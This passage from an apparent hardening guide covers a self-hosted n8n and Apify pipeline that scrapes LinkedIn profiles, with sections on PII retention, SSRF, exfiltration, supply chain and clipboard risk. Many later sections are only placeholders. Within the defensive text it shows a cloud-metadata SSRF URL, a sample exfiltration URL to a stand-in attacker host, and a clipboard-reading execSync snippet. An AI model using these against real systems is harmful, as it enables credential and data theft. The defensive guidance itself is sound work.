| skills/endorsements | public | LinkedIn | Yes |
| derived/enriched data | derived | LLM/enrichment | Yes |

**Data minimization**: Configure Apify actors to scrape only fields required for lead generation — not entire profiles. Fewer fields stored means smaller breach impact and lower notification burden.

**Data flow map** — where PII lives:

| Location | At Rest | In Transit | Retention |
|----------|---------|------------|-----------|
| n8n database (SQLite) | Encrypted (FileVault + n8n encryption) | N/A | Until explicitly deleted |
| Docker volumes | Encrypted (FileVault) | N/A | Until volume removed |
| n8n execution logs | Contains full input/output data | N/A | Configure retention limit |
| Apify platform | Apify-managed | HTTPS | Configure minimum retention |
| Time Machine backups | May contain PII snapshots | N/A | Per backup retention policy |
| Backup archives | Must be encrypted (§9.3) | N/A | Per retention policy |

**Retention limits:**

```bash
# Configure n8n execution log retention (contains PII in workflow data)
# Set in environment variables:
EXECUTIONS_DATA_SAVE_ON_SUCCESS=none  # Don't retain successful execution data
EXECUTIONS_DATA_MAX_AGE=168           # Delete execution data older than 168 hours (7 days)
```

**Spotlight exclusion** — prevent PII from appearing in Spotlight search:

```bash
# Containerized: exclude Docker volumes
sudo mdutil -i off /var/lib/docker 2>/dev/null || true

# Bare-metal: exclude n8n data directory
sudo mdutil -i off /opt/n8n
```

**Breach notification obligations:**

- **GDPR**: 72-hour notification to supervisory authority if EU residents' data is involved (Article 33)
- **CCPA**: Prompt notification to affected California residents with potential statutory damages
- **LinkedIn ToS**: Scraping may violate Terms of Service; a breach involving scraped data may trigger LinkedIn enforcement action

> **NOTE**: Consult legal counsel before scraping LinkedIn data at scale. The legal landscape around web scraping continues to evolve (see *hiQ Labs v. LinkedIn*, 9th Cir. 2022).

#### Verification

```bash
# Verify Spotlight is disabled for n8n data directories
mdutil -s /opt/n8n 2>/dev/null  # Bare-metal
# Expected: "Indexing disabled"
```

**Audit check**: `CHK-SPOTLIGHT-EXCLUSIONS` (WARN) → §7.4

### 7.5 SSRF Defense

**Threat**: Attacker-controlled URLs in scraped data or webhook payloads direct n8n's HTTP Request node to internal services, enabling internal network reconnaissance and data exfiltration
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A10 SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/), [MITRE ATT&CK T1090](https://attack.mitre.org/techniques/T1090/)

#### Why This Matters

n8n's HTTP Request node follows URLs provided in workflow data. If an attacker controls the URL (via a scraped LinkedIn field containing `http://169.254.169.254/latest/meta-data/`), they can direct n8n to make requests to internal services — the Docker bridge network, host services, cloud metadata endpoints, or LAN devices.

#### How to Harden

**Internal targets at risk:**

| Target | Risk | Deployment |
|--------|------|------------|
| Docker bridge network (172.17.0.0/16) | Access other containers | Containerized |
| Host gateway (host.docker.internal) | Access host services | Containerized |
| Cloud metadata (169.254.169.254) | Cloud credential theft | Both |
| localhost services (SSH, Screen Sharing) | Service exploitation | Both |
| LAN devices | Lateral movement | Both |

**Mitigations:**

- Never interpolate untrusted data into URL fields — use allowlisted base URLs with only path or query parameters from scraped data
- **Containerized**: Configure pf rules on the host to block container access to internal ranges:

```bash
# Block container access to host services and LAN (add to /etc/pf.conf)
# Allow only required external destinations
block out on bridge100 from any to 127.0.0.0/8
block out on bridge100 from any to 169.254.169.254
block out on bridge100 from any to 10.0.0.0/8
block out on bridge100 from any to 172.16.0.0/12
block out on bridge100 from any to 192.168.0.0/16
```

- **Bare-metal**: pf rules blocking outbound connections from the `_n8n` user to localhost services and LAN ranges
- Use Docker `--internal` network flag for containers that don't need external access

#### Verification

```bash
# Test SSRF defense from inside container
docker compose exec n8n curl -s --connect-timeout 3 http://169.254.169.254/ 2>&1
# Expected: connection refused or timeout

docker compose exec n8n curl -s --connect-timeout 3 http://host.docker.internal:22/ 2>&1
# Expected: connection refused or timeout
```

### 7.6 Data Exfiltration Prevention

**Threat**: Attacker exfiltrates PII or credentials via "non-dangerous" n8n nodes that can send data externally — HTTP Request, Email, Slack, database nodes — without executing arbitrary code
**Layer**: Prevent
**Deployment**: Both
**Source**: [MITRE ATT&CK T1041](https://attack.mitre.org/techniques/T1041/) (Exfiltration Over C2 Channel), [MITRE ATT&CK T1567](https://attack.mitre.org/techniques/T1567/) (Exfiltration Over Web Service)

#### Why This Matters

An attacker who gains workflow modification access (via API, UI, or injection) can add a node that silently copies all processed data to an external endpoint. Even nodes that don't execute code — like HTTP Request or Email — can exfiltrate data. Outbound filtering (§3.3) is the primary technical defense.

#### How to Harden

**Exfiltration-capable nodes:**

| Node Type | Exfiltration Method | Defense |
|-----------|-------------------|---------|
| HTTP Request | POST data to attacker URL | Outbound allowlist (§3.3), URL validation |
| Email/SMTP | Email data to attacker address | SMTP relay restrictions |
| Slack/Discord/Telegram | Send data to messaging platforms | Webhook URL validation |
| Database nodes | Write data to external databases | Network filtering |
| Webhook Response | Include data in responses | Response content review |

**Defenses:**

- **Outbound filtering** (§3.3): pf allowlist blocks connections to non-approved destinations — even if a workflow tries to exfiltrate, the connection is blocked
- **Workflow integrity monitoring** (§8.3): Detect unauthorized workflow modifications that add exfiltration nodes
- **Scraped URL caution**: Never use scraped URLs in HTTP Request nodes without domain allowlisting — a crafted LinkedIn field like `http://attacker.com/collect?data=` leaks your IP and potentially other data

### 7.7 Supply Chain Integrity

**Threat**: Compromised software packages — Docker images, Homebrew formulae, npm packages — execute malicious code during installation or at runtime
**Layer**: Prevent
**Deployment**: Both
**Source**: [NIST SP 800-218](https://csrc.nist.gov/publications/detail/sp/800-218/final) (SSDF), [MITRE ATT&CK T1195.001](https://attack.mitre.org/techniques/T1195/001/) (Compromise Software Dependencies)

#### Why This Matters

This deployment depends on multiple package ecosystems (Docker Hub, Homebrew, npm), each with distinct trust models. A compromised Docker image or malicious npm postinstall script achieves code execution with the privileges of the n8n process.

#### How to Harden

**Docker image integrity:**

```bash
# Pin images by digest (not mutable tags like :latest)
# In docker-compose.yml:
#   image: n8nio/n8n@sha256:<digest>

# Record current image digest
docker inspect n8nio/n8n --format '{{index .RepoDigests 0}}' 2>/dev/null

# Enable Docker Content Trust for signature verification
export DOCKER_CONTENT_TRUST=1

# Inspect image layers for unexpected content
docker history n8nio/n8n 2>/dev/null
```

**Homebrew package integrity:**

```bash
# Verify package source before installing
brew info <package>

# Avoid third-party taps for security-critical tools
# Only use official Homebrew formulae or well-known taps

# Check for security advisories after updates
brew audit --strict <package>
```

**npm supply chain** (bare-metal path):

```bash
# Install with --ignore-scripts to prevent postinstall code execution
npm install --ignore-scripts n8n

# Review postinstall scripts before allowing
cat node_modules/n8n/package.json | jq '.scripts'

# Audit for known vulnerabilities
npm audit
```

**Image scanning schedule**: Periodically scan Docker images for known vulnerabilities:

```bash
# Using Trivy (free, open-source)
brew install aquasecurity/trivy/trivy
trivy image n8nio/n8n
```

### 7.8 Apify Actor Security

**Threat**: Malicious or compromised Apify actors modify scraped data to include injection payloads, or exfiltrate the operator's Apify API key
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A08 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/), [MITRE ATT&CK T1195.002](https://attack.mitre.org/techniques/T1195/002/)

#### Why This Matters

Apify actors are the first point of contact with untrusted data. A compromised actor can modify scraped data to include injection payloads, or silently exfiltrate the operator's API key. Even legitimate actors return data from LinkedIn profiles that anyone can edit.

#### How to Harden

**Actor trust:**

- Only use official Apify actors or actors from verified publishers with high usage counts
- Third-party actors with low usage or no source code are high risk
- Review actor source code if available on GitHub

**API key security:**

- Use scoped API tokens if Apify supports them (limited to specific actors and datasets)
- Store API keys in n8n's credential manager — never hardcode in workflows
- Rotate API keys per the schedule in §7.2

**Actor output validation:**

- Validate actor output schema in the n8n workflow before processing
- Check expected fields exist, validate data types and length limits
- Reject payloads that don't match the expected structure

**Apify webhook authentication:**

Apify does NOT support HMAC webhook signing. Instead:

1. Add a secret token to the webhook URL: `https://your-server/webhook/path?token=SECRET`
2. Combine with n8n webhook Header Auth (§5.5)
3. Optionally validate `X-Apify-Webhook-Dispatch-Id` against Apify's API

**Data residency:**

Scraped LinkedIn PII exists on Apify's servers as well as the Mac Mini. Configure Apify data retention to the minimum period and delete datasets after n8n retrieval.

### 7.9 Secure Deletion

**Threat**: Deleted PII persists on APFS/SSD storage due to copy-on-write semantics and TRIM behavior, remaining recoverable by an attacker with physical access
**Layer**: Prevent
**Deployment**: Both
**Source**: [NIST SP 800-88 Rev 1](https://csrc.nist.gov/publications/detail/sp/800-88/rev-1/final) (Media Sanitization — §2.5 SSD), [Apple Platform Security Guide](https://support.apple.com/guide/security/welcome/web)

#### Why This Matters

Traditional secure deletion (overwriting files with zeros) does not work on modern Macs. APFS uses copy-on-write, and the SSD controller performs TRIM independently — `srm` was removed in macOS Catalina because it cannot guarantee overwrite on SSDs. FileVault (§2.1) is the primary deletion defense: deleted data remains encrypted on disk.

#### How to Harden

**FileVault as deletion defense:**

When FileVault is enabled, deleted data persists in encrypted form. An attacker with physical disk access cannot read deleted data without the FileVault key. This makes FileVault not just a theft defense but a deletion defense.

**Crypto-shredding:**

The most reliable way to permanently destroy all data on an encrypted volume is crypto-shredding — destroying the encryption key:

```bash
# Full volume crypto-shred (destroys ALL data):
# System Settings > General > Transfer or Reset > Erase All Content and Settings
# This is irreversible — use only for decommissioning
```

For individual files, there is no reliable crypto-shredding mechanism. Data is protected by FileVault encryption while it persists on disk.

**Practical deletion procedures:**

```bash
# Purge n8n execution logs (contain PII):
# Use n8n CLI
n8n export:workflow --all --output=backup-workflows.json
# Then delete old executions via n8n UI or API

# Delete Docker volumes containing PII:
docker compose down
docker volume rm n8n_data  # WARNING: destroys all n8n data

# Delete local Time Machine snapshots:
tmutil deletelocalsnapshots /
# NOTE: cannot selectively delete individual files from snapshots
```

**Time Machine snapshot implications:**

When PII is deleted from n8n's database, it may persist in Time Machine local snapshots and backup volumes. Old backups containing PII should be scheduled for destruction per the data retention policy (§7.4).

#### Edge Cases and Warnings

- **APFS snapshots**: APFS creates local snapshots automatically. Deleted files persist in snapshots until they are removed.
- **Docker build cache**: `docker builder prune` clears build cache that may contain sensitive files from build context.
- **Temp files**: n8n writes temp files to `/var/folders/` (bare-metal) or `/tmp` (containerized). These may contain PII from workflow executions. Containerized deployments use `tmpfs` mounts that are cleared on container restart.

### 7.10 Clipboard Security

**Threat**: Credentials copied to the macOS clipboard are accessible to any process running as the same user, including compromised n8n Code nodes on bare-metal `[EDUCATIONAL]`
**Layer**: Prevent
**Deployment**: Both (primarily bare-metal risk)
**Source**: [MITRE ATT&CK T1115](https://attack.mitre.org/techniques/T1115/) (Clipboard Data), [Apple Developer Documentation — NSPasteboard](https://developer.apple.com/documentation/appkit/nspasteboard)

#### Why This Matters

On macOS, the system pasteboard is accessible to all processes running as the same user. On bare-metal, a compromised Code node can read the clipboard via `require('child_process').execSync('pbpaste').toString()`. On containerized deployments, the n8n process has no access to the macOS pasteboard.

#### How to Harden

- Use a password manager (Bitwarden CLI, free) to inject credentials directly into config files, avoiding the clipboard entirely
- If clipboard use is unavoidable, clear immediately after pasting:

```bash
pbcopy < /dev/null
```

- On bare-metal: perform credential management only when n8n is stopped, or with n8n running under the `_n8n` service account (§6.1) which cannot access the admin user's clipboard
- Disable Universal Clipboard (Handoff) to prevent clipboard syncing between Apple devices (§8.6)

**Containerized advantage**: The n8n container has no access to the macOS pasteboard — this is another security benefit of containerization.

> **NOTE**: There is no reliable macOS mechanism to detect clipboard monitoring by a process running as the same user. This is a fundamental limitation of same-user execution, reinforcing the recommendation for containerization or service account isolation (§6.1).

**Audit check**: `CHK-CONFIG-PROFILES` (WARN) → §2.10 (cross-reference — configuration profile audit)

---

## 8. Detection and Monitoring (Detect)

### 8.1 IDS Tools

<!-- Content: T039 -->

### 8.2 Launch Daemon and Persistence Auditing

<!-- Content: T039 -->

### 8.3 Workflow Integrity Monitoring

<!-- Content: T039 -->

### 8.4 macOS Logging

<!-- Content: T039 -->

### 8.5 Credential Exposure Monitoring

<!-- Content: T039 -->

### 8.6 iCloud and Cloud Service Exposure

<!-- Content: T039 -->

### 8.7 Certificate Trust Monitoring

<!-- Content: T039 -->

---

## 9. Response and Recovery (Respond)

### 9.1 Incident Response Runbook

<!-- Content: T044 -->

### 9.2 Credential Rotation Procedures

<!-- Content: T044 -->

### 9.3 Backup and Recovery

<!-- Content: T044 -->

### 9.4 Restore Testing

<!-- Content: T044 -->

### 9.5 Physical Security

<!-- Content: T044 -->

---

## 10. Operational Maintenance

### 10.1 Automated Audit Scheduling

<!-- Content: T049 -->

### 10.2 Notification Setup

<!-- Content: T049 -->

### 10.3 Tool Maintenance

<!-- Content: T049 -->

### 10.4 Log Retention and Rotation

<!-- Content: T049 -->

### 10.5 Troubleshooting Common Failures

<!-- Content: T049 -->

### 10.6 Hardening Validation Tests

<!-- Content: T049 -->

---

## 11. Audit Script Reference

### 11.1 Running the Audit Script

<!-- Content: T054 -->

### 11.2 Check Reference Table

<!-- Content: T054 -->

### 11.3 JSON Output Schema

<!-- Content: T054 -->

### 11.4 Interpreting Results

<!-- Content: T054 -->

---

## Appendix A: Security Environment Variable Reference

<!-- Content: T059 -->

## Appendix B: Credential Inventory Template

<!-- Content: T060 -->

## Appendix C: Incident Response Checklist

<!-- Content: T061 -->

## Appendix D: Tool Comparison Matrix

<!-- Content: T062 -->

## Appendix E: PII Data Classification Table

<!-- Content: T063 -->
